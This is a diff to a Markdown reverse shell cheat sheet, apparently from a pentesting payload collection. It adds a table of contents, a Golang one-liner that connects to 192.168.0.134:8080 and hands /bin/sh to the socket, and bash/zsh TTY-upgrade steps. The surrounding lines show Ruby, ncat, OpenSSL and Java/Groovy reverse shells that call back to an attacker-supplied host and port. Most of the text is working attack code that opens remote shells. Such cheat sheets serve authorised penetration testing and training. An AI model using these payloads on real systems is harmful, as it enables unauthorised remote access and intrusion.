@@ -1,6 +1,30 @@
-# Reverse Shell Methods
+# Reverse Shell Cheat Sheet
 
-## Reverse Shell Cheat Sheet
+## Summary
+
+* [Reverse Shell](#reverse-shell)
+    * [Bash TCP](#bash-tcp)
+    * [Bash UDP](#bash-udp)
+    * [Perl](#perl)
+    * [Python](#python)
+    * [PHP](#php)
+    * [Ruby](#ruby)
+    * [Golang](#golang)
+    * [Netcat Traditional](#netcat-traditional)
+    * [Netcat OpenBsd](#netcat-openbsd)
+    * [Ncat](#ncat)
+    * [OpenSSL](#openssl)
+    * [Powershell](#powershell)
+    * [Awk](#awk)
+    * [Java](#java)
+    * [War](#war)
+    * [Lua](#lua)
+    * [NodeJS](#nodejs)
+    * [Groovy](#groovy)
+* [Spawn TTY Shell](#spawn-tty-shell)
+* [References](#references)
+
+## Reverse Shell
 
 ### Bash TCP
 
@@ -78,6 +102,12 @@ NOTE: Windows only
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
+### Golang
+
+```bash
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+```
+
 ### Netcat Traditional
 
 ```bash
@@ -97,7 +127,7 @@ ncat 127.0.0.1 4444 -e /bin/bash
 ncat --udp 127.0.0.1 4444 -e /bin/bash
 ```
 
-## OpenSSL
+### OpenSSL
 
 ```powershell
 hacker@kali$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
@@ -189,8 +219,9 @@ or
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
 
-### Groovy - by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
+### Groovy
 
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
 NOTE: Java reverse shell also work for Groovy
 
 ```javascript
@@ -200,16 +231,25 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-## Spawn TTY
+## Spawn TTY Shell
 
 Access shortcuts, su, nano and autocomplete in a partially tty shell
+
 /!\ OhMyZSH might break this trick, a simple `sh` is recommended
+
+> The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect
 
 ```powershell
 ctrl+z
 echo $TERM && tput lines && tput cols
+
+# for bash
 stty raw -echo
 fg
+
+# for zsh
+stty raw -echo; fg
+
 reset
 export SHELL=bash
 export TERM=xterm-256color
